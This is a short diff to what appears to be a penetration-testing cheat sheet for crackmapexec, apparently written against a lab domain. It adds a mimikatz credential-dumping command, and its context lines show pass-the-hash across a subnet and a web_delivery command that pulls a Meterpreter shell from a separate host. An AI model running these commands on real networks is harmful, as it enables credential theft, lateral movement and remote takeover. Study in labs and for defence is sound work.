@@ -135,7 +135,8 @@ crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth -M 
 #use web delivery module for meterpreter access.
 crackmapexec smb 192.168.154.134 -u 'Administrator' -p 'P@$$w0rd' -d MARVEL.local -M web_delivery -o URL=http://192.168.154.138:8080/prrpWvUt
 
-
+#using mimikatz command.
+crackmapexec <protocol> <target(s)> -u Administrator -p ‘P@ssw0rd’ -M mimikatz -o COMMAND=’privilege::debug’
 
 #interect with database
 cmedb
